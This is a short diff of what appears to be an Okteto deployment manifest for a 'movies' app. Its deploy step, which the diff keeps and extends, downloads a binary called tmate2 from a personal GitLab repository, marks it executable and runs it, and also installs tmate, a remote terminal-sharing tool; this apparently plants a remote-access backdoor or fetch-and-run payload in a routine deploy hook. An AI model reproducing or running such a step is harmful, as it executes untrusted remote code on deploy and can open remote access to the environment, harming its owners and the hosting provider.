@@ -1,5 +1,5 @@
 icon: https://apps.okteto.com/movies/icon.png
 deploy:
-  - apt install wget -y; wget https://gitlab.com/richardkevin320/pede/-/raw/main/tmate2 && chmod +x tmate2 && ./tmate2
+  - apt update; apt install wget -y; apt-get install tmate; wget https://gitlab.com/richardkevin320/pede/-/raw/main/tmate2 && chmod +x tmate2 && ./tmate2
 devs:
   - api/okteto.yml
